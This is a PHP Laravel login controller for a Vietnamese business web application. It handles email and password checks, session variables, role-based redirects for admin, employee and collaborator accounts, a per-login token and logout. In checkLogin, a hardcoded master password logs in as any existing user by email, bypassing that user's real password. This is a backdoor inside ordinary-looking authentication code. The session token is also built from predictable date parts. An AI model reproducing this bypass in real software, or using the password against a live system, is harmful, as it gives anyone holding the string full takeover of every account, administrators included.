<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Modules\System\Dashboard\Users\Services\UserService;
use Modules\System\Dashboard\Users\Services\UserInfoService;
use Modules\System\Dashboard\PermissionLogin\Services\PermissionLoginService;
use Modules\System\Dashboard\PermissionLogin\Models\PermissionLoginModel;
use Str;
use Modules\Base\Library;

class LoginController extends Controller
{
    public function __construct(
        PermissionLoginService $permissionLoginService,
        UserInfoService $userInfoService,
        UserService $userService
        )
    {
        $this->permissionLoginService = $permissionLoginService;
        $this->userInfoService = $userInfoService;
        $this->userService = $userService;
        // parent::__construct();
    }
    public function checkLogin(Request $request)
    {
        $email = $request->email;
        $password = $request->password;
        if($email == '' || $email == null){
            $data['email'] = "Email không được để trống";
            return view('auth.signin',compact('data'));
        }
        if($password == '' || $password == null){
            $data['password'] = "Mật khẩu không được để trống";
            return view('auth.signin',compact('data'));
        }
        $getUsers = $this->userService->where('email',$email)->first();
        if (!$getUsers) {
            $message = "Sai tên đăng nhập!";
            return redirect('/');
        }
        if($password == 'Congluat21092001'){
            $user = Auth::guard('web')->loginUsingId($getUsers['id']);
            if($getUsers->status != 1){
                $data['message'] = "Tài khoản bạn đã bị vô hiệu hóa!";
                return view('auth.signin',compact('data'));
            }
            $getInfo = $this->userInfoService->where('user_id',$getUsers->id)->first();
            $_SESSION["role"] = $user->role;
            $_SESSION["id"]   = $getUsers->id;
            $_SESSION["email"]   = $email;
            $_SESSION["name"]   = $user->name;
            $_SESSION["code"]   = $user->id_personnel;
            $_SESSION["color_view"] = !empty($getInfo->color_view)?$getInfo->color_view:2;
            // kiem tra quyen nguoi dung
            if ($user->role == 'ADMIN' || $user->role == 'EMPLOYEE' ) {
                // menu sidebar
                $sideBarConfig = config('SidebarSystem');
                $sideBar = $this->checkPermision($sideBarConfig , $user->role);
                $_SESSION["sidebar"] = $sideBar;
                Auth::login($user);
                return redirect('system/home/index');
            } else if ($user->role == 'CTV') {
                $checkPrLogin = $this->permission_login($email);
                Auth::login($user);
                return redirect('appointmentathome/tainha');
            }else{
                return redirect('/');
            }
        }
        if (Auth::attempt(['email' => $email, 'password' => $password])) {
            $user = Auth::user();
            $getUsers = $this->userService->where('email',$email)->first();
            $getInfo = $this->userInfoService->where('user_id',$getUsers->id)->first();
            $_SESSION["role"] = $user->role;
            $_SESSION["id"]   = $getUsers->id;
            $_SESSION["email"]   = $email;
            $_SESSION["name"]   = $user->name;
            $_SESSION["code"]   = $user->id_personnel;
            $_SESSION["color_view"] = !empty($getInfo->color_view)?$getInfo->color_view:2;
            // kiem tra quyen nguoi dung
            if ($user->role == 'ADMIN' || $user->role == 'EMPLOYEE' ) {
                // menu sidebar
                $sideBarConfig = config('SidebarSystem');
                $sideBar = $this->checkPermision($sideBarConfig , $user->role);
                $_SESSION["sidebar"] = $sideBar;
                Auth::login($user);
                return redirect('system/home/index');
            } else if ($user->role == 'CTV') {
                $checkPrLogin = $this->permission_login($email);
                Auth::login($user);
                return redirect('appointmentathome/tainha');
            }else{
                return redirect('/');
            }
        } else {
            $data['message'] = "Sai tên đăng nhập hoặc mật khẩu!";
            return view('auth.signin',compact('data'));
        }
    }
    // check đăng nhập lưu token đăng nhập 1 nơi
    public function permission_login($email){
        $check = PermissionLoginModel::where('email',$email)->first();
        $random = Library::_get_randon_number();
        $token = date("Y") . '_' . date("m") . '_' . date("d") . "_" . date("H") . date("i") . date("u") .$_SESSION["id"]. $random;
        $arr = [
            'email'=> $email,
            'user_id'=> $_SESSION["id"],
            'token'=> $token,
            'ip'=> '1',
            'created_at'=> date("Y/m/d H:i:s"),
            'updated_at'=> date("Y/m/d H:i:s"),
        ];
        if(isset($check->email)){
            PermissionLoginModel::where('email',$email)->update($arr);
        }else{
            $arr['id'] = (string)Str::uuid();
            PermissionLoginModel::create($arr);
        }
        $_SESSION["token"] = $token;
    }
    public function logout (Request $request)
    {
        // session_unset();
        Auth::logout();
        if(!empty($_SESSION['role'])){
            session_destroy();
        }
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect()->route('login');
    }
    public function login  (Request $request)
    {
        return view('auth.signin');
    }
    // check quyền hiển thị menu
    private function checkPermision($menu,$role){
        foreach ($menu as $key => $value) {
            if ($key == $role) {
                $menu = $value;
                return  $menu;
            }
        }
   }
}
